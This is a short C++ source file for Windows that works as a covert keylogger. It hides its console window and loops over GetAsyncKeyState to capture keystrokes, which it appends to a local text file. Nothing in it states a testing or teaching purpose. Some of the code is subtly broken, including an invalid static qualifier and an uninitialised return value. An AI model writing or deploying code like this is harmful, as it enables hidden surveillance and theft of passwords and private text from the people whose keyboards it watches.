#include "common.hpp"
#include <Windows.h>
#include <conio.h>
#include <fstream>

char Special_Key(int key)
{
    char sym;
    switch (key)
    {
        case VK_SPACE:
        sym = ' ';
        break;
        case VK_RETURN:
        sym = '\n';
        break;
        case VK_CONTROL:
        sym = '\\';
        break;
    }
    return sym;
}

static void key_log::WriteToFile(char * c)
{
    std::fstream input;
    input.open("./text.txt", std::ios::app);
    input << *c;
    input.close();
}

int main()
{
    int * spec_key = new int[3];
    spec_key[0] = VK_SPACE;
    spec_key[1] = VK_RETURN;
    spec_key[2] = VK_CONTROL;
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    while (1)
    {
        for (int key = 9; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                for (int spec = 0; spec < 3; spec++)
                {
                    if (key == spec_key[spec])
                    {
                        char sym = Special_Key(key);
                        key_log::WriteToFile((char*)&sym);
                    }
                }
                key_log::WriteToFile((char*)&key);   
            }
    }
    }
}